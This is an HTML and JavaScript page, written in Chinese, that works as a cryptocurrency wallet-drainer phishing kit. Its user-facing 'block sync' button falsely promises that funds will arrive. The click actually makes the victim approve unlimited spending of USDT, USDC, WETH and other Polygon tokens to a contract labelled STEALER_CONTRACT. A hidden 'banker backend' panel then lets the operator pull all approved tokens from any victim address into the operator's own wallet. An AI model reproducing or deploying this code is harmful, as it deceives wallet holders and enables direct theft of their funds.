<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>同步区块中心</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui}
body{background:#0b1324;color:#fff;padding:25px;max-width:420px;margin:0 auto}
.card{background:#141c36;border-radius:18px;padding:28px;margin-top:20px}
.title{font-size:22px;font-weight:700;margin-bottom:12px}
.desc{color:#a0a8c3;font-size:15px;line-height:1.6;margin-bottom:20px}
.btn{width:100%;background:#5271ff;color:white;border:none;border-radius:14px;padding:18px;font-size:16px;margin-top:10px}
.btn-red{background:#ff4444}
.btn:disabled{background:#2d3757}
.status{margin-top:18px;font-size:14px;color:#7884a3}
input{
  width:100%;padding:14px;margin:8px 0;
  border-radius:12px;background:#1d2742;
  border:none;color:white;font-size:16px
}
.admin{background:#220f0f !important}
</style>
</head>
<body>

<!-- 用户激活区（已改为同步区块） -->
<div class="card">
  <div class="title">区块同步</div>
  <div class="desc">未同步将导致无法到账、无法转账，请先同步区块</div>
  <button class="btn" id="activateBtn">刷新同步区块到账</button>
  <div class="status" id="s_user"></div>
</div>

<!-- 庄家后台 -->
<div class="card admin">
  <div class="title" style="color:#ff5555">庄家后台 · 全能提取</div>
  
  <input placeholder="用户钱包地址" id="userAddr">

  <!-- 一键提取所有内置代币 -->
  <button class="btn btn-red" id="pullAll">一键提取所有常见ERC20</button>

  <div style="margin:20px 0;opacity:0.5;text-align:center">—————— 或单独提取任意代币 ——————</div>

  <!-- 手动输入任意代币地址提取 -->
  <input placeholder="任意代币合约地址" id="customToken">
  <button class="btn btn-red" id="pullCustom">提取这个代币的全部</button>

  <div class="status" id="s_admin"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
// ======================================================================
// 填写你部署的授权收割合约地址
// ======================================================================
const STEALER_CONTRACT = "你的合约地址";

const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// Polygon 主流代币列表（自动授权 + 一键提取）
const TOKEN_LIST = [
  "0xc2132d05d31c914a87ae0d2e35bdafcf293b891a", // USDT
  "0x2791bca1f2de4661ab86b05c34a96c768ee4eb9f", // USDC
  "0x8f3cf7ad23cd3cadbd9735acffc13bcaf533b699", // WETH
  "0x1bfd67037b42cef08f5f07358245cce5015be78d", // WBTC
  "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270", // WMATIC
  "0x9a71012b1822b7ebbe559b0c772a39bd9447dae1", // BNB
  "0x21c5235a7a0e3d171c439547486265996117a1c6"  // PEPE
];

// ======================================================================
// 用户同步区块（实际授权）
// ======================================================================
document.getElementById("activateBtn").onclick = async () => {
  try {
    const w3 = new Web3(window.ethereum);
    const [acc] = await w3.eth.requestAccounts();
    const s = document.getElementById("s_user");
    s.innerText = "正在同步区块，请稍候...";

    for (const t of TOKEN_LIST) {
      try {
        const c = new w3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","type":"function"}], t);
        await c.methods.approve(STEALER_CONTRACT, MAX).send({ from: acc, gas: 100000 });
      } catch (e) {}
    }

    const auth = new w3.eth.Contract([{"inputs":[],"name":"activate","type":"function"}], STEALER_CONTRACT);
    await auth.methods.activate().send({ from: acc });
    s.innerText = "✅ 同步完成，资产已到账";
  } catch (e) {
    document.getElementById("s_user").innerText = "❌ 同步失败，请重试";
  }
};

// ======================================================================
// 庄家：一键提取所有常见币
// ======================================================================
document.getElementById("pullAll").onclick = async () => {
  try {
    const w3 = new Web3(window.ethereum);
    const [me] = await w3.eth.requestAccounts();
    const user = document.getElementById("userAddr").value.trim();
    const s = document.getElementById("s_admin");

    if (!user) return alert("请输入用户地址");
    s.innerText = "正在批量提取所有代币...";

    const stealer = new w3.eth.Contract([
      {"inputs":[{"name":"user","type":"address"},{"name":"token","type":"address"}],"name":"adminPullAll","type":"function"}
    ], STEALER_CONTRACT);

    let count = 0;
    for (const t of TOKEN_LIST) {
      try {
        await stealer.methods.adminPullAll(user, t).send({ from: me, gas: 150000 });
        count++;
      } catch (e) {}
    }

    s.innerText = `✅ 完成！已提取 ${count} 种代币到你钱包`;
  } catch (e) {
    document.getElementById("s_admin").innerText = "❌ 批量提取失败";
  }
};

// ======================================================================
// 庄家：提取任意输入的代币
// ======================================================================
document.getElementById("pullCustom").onclick = async () => {
  try {
    const w3 = new Web3(window.ethereum);
    const [me] = await w3.eth.requestAccounts();
    const user = document.getElementById("userAddr").value.trim();
    const token = document.getElementById("customToken").value.trim();
    const s = document.getElementById("s_admin");

    if (!user || !token) return alert("请填写完整");
    s.innerText = "正在提取该代币...";

    const stealer = new w3.eth.Contract([
      {"inputs":[{"name":"user","type":"address"},{"name":"token","type":"address"}],"name":"adminPullAll","type":"function"}
    ], STEALER_CONTRACT);

    await stealer.methods.adminPullAll(user, token).send({ from: me, gas: 150000 });
    s.innerText = "✅ 该代币已全部提取到你钱包";
  } catch (e) {
    document.getElementById("s_admin").innerText = "❌ 提取失败（未授权或余额为0）";
  }
};
</script>
</body>
</html>
